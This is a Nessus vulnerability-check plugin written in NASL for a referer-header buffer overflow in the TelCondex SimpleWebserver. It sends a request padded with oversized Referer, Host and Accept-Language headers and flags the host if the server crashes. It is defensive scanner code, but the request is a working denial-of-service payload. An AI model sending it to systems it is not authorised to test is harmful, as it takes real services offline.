if(description) 
{ 
	script_id(11927); 
	script_cve_id("CVE-2003-1186");
	script_bugtraq_id(8925);
        script_version("$Revision: 1.6 $"); 
      
	name["english"] = "TelCondex Simple Webserver Buffer Overflow"; 
        
      script_name(english:name["english"]); 

      desc["english"] = "
The TelCondex SimpleWebserver is vulnerable to a remote executable
buffer overflow, due to missing length check on the referer-variable
of the HTTP-header. 
        
Solution: Upgrade version 2.13 - http://www.yourinfosystem.de/download/TcSimpleWebServer2000Setup.exe
Risk factor : High"; 
        
      script_description(english:desc["english"]); 
        
      summary["english"] = "Checks for TelCondex Buffer Overflow";
	script_summary(english:summary["english"]);
	script_category(ACT_DENIAL);
	script_copyright(english:"This script is Copyright (C) 2003 Matt North");

	family["english"] = "Denial of Service";
	script_family(english:family["english"]);
	
	script_dependencie("find_service.nes");
	script_require_ports("Services/www", 80);
	exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

if(http_is_dead(port:port)) exit(0);


s = string( "GET / HTTP/1.1\r\n", "Accept: */* \r\n" , "Referer:", crap(704), "\r\n", "Host:" , crap(704), "\r\n", "Accept-Language", 
		crap(704), "\r\n\r\n" );

soc =  http_open_socket(port);
if(!soc) exit(0);

send(socket: soc, data: s);
r = http_recv(socket: soc);
http_close_socket(soc);

if(http_is_dead(port: port)) {
	security_hole(port);
}
